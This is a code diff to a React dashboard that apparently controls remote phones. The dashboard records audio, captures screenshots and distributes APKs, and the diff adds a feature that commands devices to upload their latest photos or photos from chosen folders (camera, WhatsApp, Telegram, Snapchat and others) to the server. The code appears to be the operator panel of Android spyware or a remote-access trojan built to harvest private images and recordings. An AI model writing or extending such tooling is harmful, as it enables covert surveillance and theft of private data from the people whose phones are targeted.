@@ -319,7 +319,7 @@
   }
 
   /* ─── Device Card ───────────────────────────────────────────── */
-  function DeviceCard({dev, selectedDuration, onRecord, onStop, onScreenshot, onRename, onSetAudioSource, onTestAudio, timer, ssStatus, audioTesting}) {
+  function DeviceCard({dev, selectedDuration, onRecord, onStop, onScreenshot, onRename, onSetAudioSource, onTestAudio, onDeleteDevice, onGetGalleryStats, timer, ssStatus, audioTesting}) {
     const [editing, setEditing] = useState(false);
     const [name, setName]       = useState(dev.deviceName);
     const [audioOpen, setAudioOpen] = useState(false);
@@ -425,6 +425,18 @@
             )}
             <Btn sm outline color="#718096" onClick={()=>setAudioOpen(!audioOpen)}>
               🎤 {audioOpen ? '▲' : 'Audio'}
+            </Btn>
+            <Btn sm outline color="#E67E22" onClick={()=>onGetGalleryStats(dev.deviceId)}>
+              🖼 Gallery
+            </Btn>
+          </div>
+        )}
+
+        {/* ── Delete button for offline devices ── */}
+        {!dev.isOnline && (
+          <div style={{padding:'8px 14px 12px', borderTop:'1px solid #F7FAFC'}}>
+            <Btn sm outline color="#E53E3E" full onClick={()=>onDeleteDevice(dev.deviceId)}>
+              🗑 Remove Offline Device
             </Btn>
           </div>
         )}
@@ -601,6 +613,170 @@
     );
   }
 
+  /* ─── Gallery thumbnail ───────────────────────────────────────── */
+  function GalleryThumb({img, deviceId, onDelete, onLightbox}) {
+    return (
+      <div style={{
+        background:'#FFF', borderRadius:10, overflow:'hidden',
+        boxShadow:'0 1px 4px rgba(0,0,0,0.08)',
+      }}>
+        <img
+          src={img.url} alt={img.originalName || img.filename} loading="lazy"
+          onClick={()=>onLightbox(img.url)}
+          style={{width:'100%', height:130, objectFit:'cover', display:'block', cursor:'zoom-in'}}
+        />
+        <div style={{padding:'7px 9px 9px'}}>
+          <div style={{fontSize:11, fontWeight:600, color:'#2D3748', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap'}}>
+            {img.originalName || img.filename}
+          </div>
+          <div style={{fontSize:10, color:'#E67E22', marginTop:2}}>{img.folderName}</div>
+          <div style={{fontSize:11, color:'#718096', marginTop:1}}>{fmtDate(img.dateTaken || img.created)}</div>
+          <div style={{fontSize:11, color:'#A0AEC0', marginBottom:6}}>{fmtSize(img.size)}</div>
+          <button
+            onClick={()=>onDelete(deviceId, img.filename)}
+            style={{
+              width:'100%', fontSize:12, padding:'4px 0', borderRadius:6,
+              border:'1px solid #FED7D7', color:'#E53E3E',
+            }}
+          >Delete</button>
+        </div>
+      </div>
+    );
+  }
+
+  /* ─── Device group block (Gallery) ──────────────────────────── */
+  function GalleryGroup({deviceId, group, onDelete, onLightbox}) {
+    const [open, setOpen] = useState(true);
+    const color = devColor(deviceId);
+    return (
+      <div style={{marginBottom:18}}>
+        <button
+          onClick={()=>setOpen(!open)}
+          style={{
+            width:'100%', display:'flex', alignItems:'center', gap:10,
+            padding:'10px 14px',
+            background: color+'14',
+            borderRadius: open ? '12px 12px 0 0' : 12,
+            border:`1.5px solid ${color+'33'}`,
+            borderBottom: open ? 'none' : undefined,
+          }}
+        >
+          <span style={{width:12, height:12, borderRadius:'50%', background:color, flexShrink:0}} />
+          <span style={{flex:1, textAlign:'left', fontSize:15, fontWeight:700, color:'#2D3748'}}>
+            {group.deviceName}
+          </span>
+          <span style={{fontSize:12, color:'#718096'}}>
+            {group.images.length} image{group.images.length!==1?'s':''}
+          </span>
+          <span style={{fontSize:11, color:'#A0AEC0'}}>{open ? '▲' : '▼'}</span>
+        </button>
+
+        {open && (
+          <div style={{
+            background:'#F7FAFC', borderRadius:'0 0 12px 12px',
+            border:`1.5px solid ${color+'33'}`, borderTop:'none',
+            padding:10,
+            display:'grid', gridTemplateColumns:'repeat(2,1fr)', gap:8,
+          }}>
+            {group.images.map(img => (
+              <GalleryThumb
+                key={img.filename}
+                img={img} deviceId={deviceId}
+                onDelete={onDelete} onLightbox={onLightbox}
+              />
+            ))}
+          </div>
+        )}
+      </div>
+    );
+  }
+
+  /* ─── Gallery Stats Card ─────────────────────────────────────── */
+  function GalleryStatsCard({deviceId, stats, onGetLatest, onGetByFolder, progress}) {
+    const [count, setCount] = useState(10);
+    const [folder, setFolder] = useState('camera');
+    const dev = stats || {};
+
+    const FOLDERS = ['camera','downloads','screenshots','whatsapp','telegram','instagram','facebook','twitter','snapchat','tiktok','saved'];
+
+    const isWorking = progress && (progress.status === 'scanning' || progress.status === 'uploading');
+
+    return (
+      <Card style={{padding:16, marginBottom:12}}>
+        <div style={{display:'flex', alignItems:'center', gap:8, marginBottom:10}}>
+          <span style={{fontSize:16}}>🖼</span>
+          <span style={{fontSize:14, fontWeight:700, color:'#2D3748'}}>
+            Gallery Stats: {deviceId.slice(0,12)}…
+          </span>
+        </div>
+
+        {dev.totalImages !== undefined ? (
+          <div>
+            <div style={{display:'flex', flexWrap:'wrap', gap:8, marginBottom:12}}>
+              <Pill color="#E67E22">{dev.totalImages} images</Pill>
+              <Pill color="#4A90A4">{dev.totalSizeMB || Math.round((dev.totalSizeBytes||0)/1048576)} MB</Pill>
+              <Pill color="#7B68AE">{dev.folderCount || (dev.folders||[]).length} folders</Pill>
+            </div>
+
+            {dev.folders && dev.folders.length > 0 && (
+              <div style={{marginBottom:12}}>
+                <div style={{fontSize:12, fontWeight:600, color:'#718096', marginBottom:4}}>Folders:</div>
+                <div style={{display:'flex', flexWrap:'wrap', gap:4}}>
+                  {dev.folders.slice(0,10).map(f => (
+                    <span key={f.name} style={{
+                      fontSize:11, padding:'3px 8px', borderRadius:6,
+                      background:'#EBF8FF', color:'#2B6CB0', border:'1px solid #BEE3F8',
+                    }}>
+                      {f.name} ({f.count})
+                    </span>
+                  ))}
+                </div>
+              </div>
+            )}
+
+            {/* Get latest images */}
+            <div style={{display:'flex', gap:6, marginBottom:8, flexWrap:'wrap'}}>
+              <select value={count} onChange={e=>setCount(Number(e.target.value))}
+                style={{height:36, padding:'0 8px', fontSize:13, borderRadius:8, border:'1.5px solid #E2E8F0', background:'#FFF'}}>
+                <option value={5}>5</option>
+                <option value={10}>10</option>
+                <option value={20}>20</option>
+                <option value={50}>50</option>
+              </select>
+              <Btn sm color="#E67E22" onClick={()=>onGetLatest(deviceId, count, true)} disabled={isWorking}>
+                {isWorking ? '⏳ Working…' : `⬇ Get Latest ${count}`}
+              </Btn>
+            </div>
+
+            {/* Get by folder */}
+            <div style={{display:'flex', gap:6, flexWrap:'wrap'}}>
+              <select value={folder} onChange={e=>setFolder(e.target.value)}
+                style={{flex:1, minWidth:0, height:36, padding:'0 8px', fontSize:13, borderRadius:8, border:'1.5px solid #E2E8F0', background:'#FFF'}}>
+                {FOLDERS.map(f => <option key={f} value={f}>{f}</option>)}
+              </select>
+              <Btn sm outline color="#E67E22" onClick={()=>onGetByFolder(deviceId, folder, 20, true)} disabled={isWorking}>
+                📂 Get from folder
+              </Btn>
+            </div>
+
+            {/* Progress */}
+            {progress && progress.status === 'uploading' && (
+              <div style={{marginTop:10, padding:'8px 12px', borderRadius:8, background:'#FFFBEB', border:'1px solid #F6AD55'}}>
+                <span style={{fontSize:12, fontWeight:700, color:'#C05621'}}>
+                  ⬆ Uploading… {progress.uploaded||0}/{progress.total||'?'}
+                </span>
+              </div>
+            )}
+          </div>
+        ) : (
+          <div style={{fontSize:13, color:'#A0AEC0', textAlign:'center', padding:'12px 0'}}>
+            {dev.hasPermission === false ? 'No gallery permission on device' : 'No stats received yet. Tap "Gallery" on the device card.'}
+          </div>
+        )}
+      </Card>
+    );
+  }
+
   /* ─── Toast ─────────────────────────────────────────────────── */
   function Toast({toast, onDismiss}) {
     if (!toast) return null;
@@ -633,6 +809,10 @@
     const [devices,         setDevices]         = useState({});
     const [recordings,      setRecordings]      = useState({});
     const [screenshots,     setScreenshots]     = useState({});
+    const [gallery,         setGallery]         = useState({});
+    const [galleryStats,    setGalleryStats]    = useState({});
+    const [galleryMeta,     setGalleryMeta]     = useState({});
+    const [galleryProgress, setGalleryProgress] = useState({});
     const [ssStatus,        setSsStatus]        = useState({});
     const [timers,          setTimers]          = useState({});
     const [duration,        setDuration]        = useState(60);
@@ -652,15 +832,17 @@
     const anyRec      = useMemo(() => devList.some(d => d.isRecording), [devList]);
     const totalRec    = useMemo(() => Object.values(recordings).reduce((s,g)=>s+(g.recordings?.length||0),0), [recordings]);
     const totalShots  = useMemo(() => Object.values(screenshots).reduce((s,g)=>s+(g.screenshots?.length||0),0), [screenshots]);
+    const totalGallery = useMemo(() => Object.values(gallery).reduce((s,g)=>s+(g.images?.length||0),0), [gallery]);
 
     const showToast = useCallback((msg, type='info') => {
       setToast({msg, type});
       setTimeout(() => setToast(null), 4000);
     }, []);
 
-    const fetchRec  = useCallback(async () => { try { setRecordings(await (await fetch('/recordings')).json()); } catch(e){} }, []);
-    const fetchShot = useCallback(async () => { try { setScreenshots(await (await fetch('/api/screenshots')).json()); } catch(e){} }, []);
-    const fetchApk  = useCallback(async () => { try { setApkInfo(await (await fetch('/api/apk/info')).json()); } catch(e){} }, []);
+    const fetchRec     = useCallback(async () => { try { setRecordings(await (await fetch('/recordings')).json()); } catch(e){} }, []);
+    const fetchShot    = useCallback(async () => { try { setScreenshots(await (await fetch('/api/screenshots')).json()); } catch(e){} }, []);
+    const fetchGallery = useCallback(async () => { try { setGallery(await (await fetch('/api/gallery')).json()); } catch(e){} }, []);
+    const fetchApk     = useCallback(async () => { try { setApkInfo(await (await fetch('/api/apk/info')).json()); } catch(e){} }, []);
 
     /* Socket setup */
     useEffect(() => {
@@ -732,11 +914,52 @@
         showToast(`Retrying recording on ${d.deviceName||d.deviceId}…`, 'info');
       });
 
+      // Gallery events
+      socket.on('gallery_stats', d => {
+        setGalleryStats(p => ({ ...p, [d.deviceId]: d.stats }));
+      });
+      socket.on('gallery_scan_started', d => {
+        setGalleryProgress(p => ({ ...p, [d.deviceId]: { status:'scanning', requestId:d.requestId } }));
+      });
+      socket.on('gallery_metadata', d => {
+        setGalleryMeta(p => ({ ...p, [d.deviceId]: d }));
+        setGalleryProgress(p => ({ ...p, [d.deviceId]: { status:'metadata_ready', total:d.totalImages } }));
+      });
+      socket.on('gallery_scan_error', d => {
+        showToast(`Gallery scan error on ${d.deviceId}: ${d.error}`, 'error');
+        setGalleryProgress(p => { const c={...p}; delete c[d.deviceId]; return c; });
+      });
+      socket.on('gallery_upload_started', d => {
+        setGalleryProgress(p => ({ ...p, [d.deviceId]: { status:'uploading', total:d.totalImages, uploaded:0 } }));
+      });
+      socket.on('gallery_upload_queued', d => {
+        setGalleryProgress(p => ({ ...p, [d.deviceId]: { ...p[d.deviceId], status:'uploading', total:d.totalRequested, queued:d.queuedImages } }));
+      });
+      socket.on('gallery_image_uploaded', d => {
+        setGalleryProgress(p => {
+          const cur = p[d.deviceId] || {};
+          return { ...p, [d.deviceId]: { ...cur, uploaded:(cur.uploaded||0)+1 } };
+        });
+      });
+      socket.on('gallery_image_received', d => {
+        fetchGallery();
+      });
+      socket.on('gallery_upload_complete', d => {
+        showToast(`Gallery: ${d.uploaded} uploaded, ${d.failed} failed`, d.failed>0?'warn':'info');
+        setGalleryProgress(p => { const c={...p}; delete c[d.deviceId]; return c; });
+        fetchGallery();
+      });
+      socket.on('gallery_upload_error', d => {
+        showToast(`Gallery upload error: ${d.error}`, 'error');
+        setGalleryProgress(p => { const c={...p}; delete c[d.deviceId]; return c; });
+      });
+
       fetchRec();
       fetchShot();
+      fetchGallery();
       fetchApk();
       return () => { socket.disconnect(); Object.values(timerRefs.current).forEach(clearInterval); };
-    }, [fetchRec, fetchShot, fetchApk, showToast]);
+    }, [fetchRec, fetchShot, fetchGallery, fetchApk, showToast]);
 
     /* Timer helpers */
     const startTimer = useCallback((id, sec) => {
@@ -789,6 +1012,49 @@
     const testAudio = (deviceId) => {
       setAudioTesting(p => ({ ...p, [deviceId]: true }));
       socketRef.current.emit('test_audio_sources', { targetDeviceId: deviceId });
+    };
+
+    // Gallery actions
+    const getGalleryStats = (deviceId) => {
+      socketRef.current.emit('get_gallery_stats', { targetDeviceId: deviceId });
+      showToast('Requesting gallery stats…', 'info');
+    };
+    const getLatestImages = (deviceId, count=10, upload=false) => {
+      const requestId = `req_${Date.now()}`;
+      socketRef.current.emit('get_latest_images', { targetDeviceId:deviceId, count, upload, requestId });
+      setGalleryProgress(p => ({ ...p, [deviceId]: { status: upload?'uploading':'scanning' } }));
+    };
+    const getImagesByFolder = (deviceId, folder, count=20, upload=false) => {
+      const requestId = `req_${Date.now()}`;
+      socketRef.current.emit('get_images_by_folder', { targetDeviceId:deviceId, folder, count, upload, requestId });
+      setGalleryProgress(p => ({ ...p, [deviceId]: { status: upload?'uploading':'scanning' } }));
+    };
+    const uploadGalleryImages = (deviceId, imageIds) => {
+      const requestId = `req_${Date.now()}`;
+      socketRef.current.emit('upload_gallery_images', { targetDeviceId:deviceId, imageIds, requestId });
+      setGalleryProgress(p => ({ ...p, [deviceId]: { status:'uploading', total:imageIds.length, uploaded:0 } }));
+    };
+
+    // Delete offline device
+    const deleteDevice = async (deviceId) => {
+      if (!confirm('Remove this offline device from the list?')) return;
+      try {
+        const r = await fetch(`/api/devices/${encodeURIComponent(deviceId)}`, { method:'DELETE' });
+        if (r.ok) {
+          showToast('Device removed from list', 'info');
+        } else {
+          const d = await r.json();
+          showToast(d.error || 'Failed to delete device', 'error');
+        }
+      } catch(e) {
+        showToast('Failed to delete device', 'error');
+      }
+    };
+
+    const delGallery = async (deviceId, filename) => {
+      if (!confirm('Delete this gallery image?')) return;
+      await fetch(`/api/gallery/${encodeURIComponent(deviceId)}/${encodeURIComponent(filename)}`, {method:'DELETE'});
+      fetchGallery();
     };
 
     const uploadApk = async (file) => {
@@ -892,6 +1158,13 @@
                             padding:'1px 6px',borderRadius:10}}>{totalShots}</span>
             )}
           </button>
+          <button style={tabStyle(tab==='gallery','#E67E22')} onClick={()=>setTab('gallery')}>
+            Gallery
+            {totalGallery>0 && (
+              <span style={{marginLeft:5,fontSize:10,background:'#E67E22',color:'#FFF',
+                            padding:'1px 6px',borderRadius:10}}>{totalGallery}</span>
+            )}
+          </button>
           <button style={tabStyle(tab==='app','#DD6B20')} onClick={()=>setTab('app')}>
             App
           </button>
@@ -921,6 +1194,8 @@
                     onRename={rename}
                     onSetAudioSource={setAudioSource}
                     onTestAudio={testAudio}
+                    onDeleteDevice={deleteDevice}
+                    onGetGalleryStats={getGalleryStats}
                     timer={timers[dev.deviceId]}
                     ssStatus={ssStatus[dev.deviceId]}
                     audioTesting={!!audioTesting[dev.deviceId]}
@@ -944,6 +1219,35 @@
               : Object.entries(screenshots).map(([id, g]) => (
                   <ShotGroup key={id} deviceId={id} group={g} onDelete={delShot} onLightbox={setLightbox} />
                 ))
+          )}
+
+          {/* GALLERY */}
+          {tab === 'gallery' && (
+            <div>
+              {/* Gallery stats cards for online devices */}
+              {onlineDev.length > 0 && (
+                <div style={{marginBottom:16}}>
+                  {onlineDev.map(dev => (
+                    <GalleryStatsCard
+                      key={dev.deviceId}
+                      deviceId={dev.deviceId}
+                      stats={galleryStats[dev.deviceId]}
+                      onGetLatest={getLatestImages}
+                      onGetByFolder={getImagesByFolder}
+                      progress={galleryProgress[dev.deviceId]}
+                    />
+                  ))}
+                </div>
+              )}
+
+              {/* Downloaded gallery images */}
+              {Object.keys(gallery).length === 0
+                ? <Empty icon="🖼" title="No gallery images yet" sub="Use the Gallery button on a device to fetch images" />
+                : Object.entries(gallery).map(([id, g]) => (
+                    <GalleryGroup key={id} deviceId={id} group={g} onDelete={delGallery} onLightbox={setLightbox} />
+                  ))
+              }
+            </div>
           )}
 
           {/* APP MANAGEMENT */}
